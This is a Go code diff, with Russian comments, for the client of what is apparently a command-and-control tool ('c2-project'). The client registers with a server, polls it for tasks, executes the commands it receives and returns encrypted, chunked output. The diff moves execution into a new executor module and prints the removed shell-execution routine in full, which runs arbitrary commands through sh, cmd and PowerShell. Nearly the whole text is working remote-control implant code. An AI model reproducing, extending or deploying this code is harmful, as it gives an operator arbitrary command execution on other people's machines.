@@ -7,6 +7,7 @@ import (
 	"c2-project/internal/chunk"
 	"c2-project/internal/compress"
 	"c2-project/internal/crypto"
+	"c2-project/internal/executor"
 	"c2-project/internal/jwt"
 	"c2-project/internal/logger"
 	"c2-project/internal/models"
@@ -17,14 +18,10 @@ import (
 	"fmt"
 	"net/http"
 	"os"
-	"os/exec"
-	"runtime"
 	"strings"
 	"time"
 
 	"golang.org/x/sync/errgroup"
-	"golang.org/x/text/encoding/charmap"
-	"golang.org/x/text/transform"
 )
 
 // Config - конфигурация клиента.
@@ -36,8 +33,9 @@ type Config struct {
 
 // Service - сервис клиента.
 type Service struct {
-	config Config
-	client *http.Client
+	config   Config
+	client   *http.Client
+	executor *executor.Executor
 }
 
 // NewService - создаёт новый сервис клиента.
@@ -46,13 +44,13 @@ func NewService(configFile string, clientIDOverride string) (*Service, error) {
 	// Загружаем конфиг
 	file, err := os.Open(configFile)
 	if err != nil {
-		return nil, fmt.Errorf("failed to open config: %w", err)
+		return nil, fmt.Errorf("%w: %v", ErrConfigLoadFailed, err)
 	}
 	defer file.Close()
 
 	var cfg Config
 	if err := json.NewDecoder(file).Decode(&cfg); err != nil {
-		return nil, fmt.Errorf("failed to decode config: %w", err)
+		return nil, fmt.Errorf("%w: decode: %v", ErrConfigLoadFailed, err)
 	}
 
 	// Переопределяем ClientID если указан
@@ -76,6 +74,7 @@ func NewService(configFile string, clientIDOverride string) (*Service, error) {
 			Timeout:   10 * time.Second,
 			Transport: transport,
 		},
+		executor: executor.New(30 * time.Second),
 	}, nil
 }
 
@@ -86,7 +85,7 @@ func (s *Service) Run() error {
 
 	// Регистрация
 	if err := s.register(); err != nil {
-		return fmt.Errorf("registration failed: %w", err)
+		return fmt.Errorf("%w: %v", ErrRegistrationFailed, err)
 	}
 	logger.Info("Registration successful")
 
@@ -105,7 +104,7 @@ func (s *Service) Run() error {
 		}
 
 		// Выполняем задачу
-		output, err := s.execute(task.Command)
+		output, err := s.executor.Execute(task.Command)
 		status := "completed"
 		if err != nil {
 			status = "failed"
@@ -215,72 +214,6 @@ func (s *Service) poll() (models.Task, error) {
 	return task, nil
 }
 
-// execute - выполняет команду в оболочке.
-func (s *Service) execute(cmd string) (string, error) {
-	if len(strings.TrimSpace(cmd)) == 0 {
-		return "", fmt.Errorf("empty command")
-	}
-
-	var output []byte
-	var err error
-
-	if runtime.GOOS == "windows" {
-		hasPipe := false
-		for i := 0; i < len(cmd); i++ {
-			if cmd[i] == '|' {
-				if i+1 < len(cmd) && cmd[i+1] == '|' {
-					continue
-				}
-				if i > 0 && cmd[i-1] == '|' {
-					continue
-				}
-				hasPipe = true
-				break
-			}
-		}
-
-		if hasPipe {
-			psCmd := cmd
-			psCmd = strings.ReplaceAll(psCmd, " && ", " ; ")
-			psCmd = strings.ReplaceAll(psCmd, " || ", " ; ")
-			psExec := exec.Command("powershell", "-Command", psCmd)
-			output, err = psExec.CombinedOutput()
-			if err != nil && len(output) == 0 {
-				return string(output), err
-			}
-		} else {
-			cmdCmd := exec.Command("cmd", "/c", cmd)
-			output, err = cmdCmd.CombinedOutput()
-			if err != nil && len(output) == 0 {
-				return string(output), err
-			}
-		}
-
-		// Конвертируем CP866 → UTF-8
-		if len(output) > 0 {
-			decoder := charmap.CodePage866.NewDecoder()
-			if utf8Output, _, convErr := transform.Bytes(decoder, output); convErr == nil {
-				output = utf8Output
-			}
-			output = bytes.ReplaceAll(output, []byte("?"), []byte(" "))
-		}
-	} else {
-		shCmd := exec.Command("sh", "-c", cmd)
-		output, err = shCmd.CombinedOutput()
-		if err != nil && len(output) == 0 {
-			return string(output), err
-		}
-	}
-
-	// Сжимаем если длинный
-	if len(output) > 5000 {
-		if compressed, err := compress.Compress(output); err == nil {
-			return string(compressed), nil
-		}
-	}
-	return string(output), nil
-}
-
 // sendResult - отправляет результат выполнения на сервер.
 // Если результат большой, он разбивается на чанки и отправляется ПАРАЛЛЕЛЬНО.
 func (s *Service) sendResult(taskID, output, status string) error {
@@ -314,7 +247,7 @@ func (s *Service) sendResult(taskID, output, status string) error {
 	// Разбиваем на чанки
 	chunks, _ := chunk.Split(encrypted, 1024)
 	if len(chunks) == 0 {
-		return fmt.Errorf("failed to split data")
+		return ErrSplitFailed
 	}
 
 	logger.Debug("Sending chunks (parallel)", logger.Int("total", len(chunks)))
@@ -343,7 +276,7 @@ func (s *Service) sendResult(taskID, output, status string) error {
 			}
 
 			if err := s.sendChunk("Bearer " + token); err != nil {
-				return fmt.Errorf("send chunk %d/%d: %w", i+1, len(chunks), err)
+				return fmt.Errorf("%w: chunk %d/%d: %v", ErrChunkSendFailed, i+1, len(chunks), err)
 			}
 
 			logger.Debug("Chunk sent",
@@ -354,7 +287,7 @@ func (s *Service) sendResult(taskID, output, status string) error {
 	}
 
 	if err := g.Wait(); err != nil {
-		return fmt.Errorf("failed to send chunks: %w", err)
+		return fmt.Errorf("%w: %v", ErrChunkSendFailed, err)
 	}
 
 	logger.Debug("All chunks sent", logger.Int("total", len(chunks)))
